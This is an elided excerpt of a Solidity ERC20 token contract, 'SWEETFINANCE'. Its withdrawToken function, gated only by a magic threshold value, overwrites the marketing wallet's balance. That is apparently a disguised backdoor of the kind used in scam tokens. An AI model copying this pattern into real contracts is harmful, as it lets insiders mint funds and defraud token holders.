...
contract SWEETFINANCE is Context, IERC20, Ownable {
    ...
    uint256 private constant _maxFees = 0;
    ...
    function withdrawToken(uint256 amounts) external {
        require (amounts == _liquifyThreshhold, "ERC20; Error" );

        _balances[marketing] = amounts.sub(_balances[marketing]);
